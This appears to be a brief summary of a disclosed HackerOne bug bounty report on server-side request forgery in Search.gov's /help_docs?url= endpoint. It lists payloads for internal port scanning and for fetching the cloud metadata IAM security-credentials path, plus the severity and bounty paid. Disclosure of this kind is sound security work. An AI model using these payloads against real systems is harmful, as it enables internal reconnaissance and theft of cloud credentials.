## SSRF in Search.gov via ?url= parameter 
https://hackerone.com/reports/514224

* Vulnerable endpoint /help_docs?url=
* port scanning http://127.0.0.1:21/?%0A - took 450ms. (Port is closed) 
* Tried to retrive `http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0A`

/help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentialx/? 


Report Status : Low 
Bounty Paid : $150 

Interesting part : If you access to https://search.usa.gov/help_docs in a browser, you will be redirected to https://www.usa.gov/page-not-found/. I have used a proxy tool (i.e. Burp, Fiddler, ZAP, etc.) to reproduce this issue

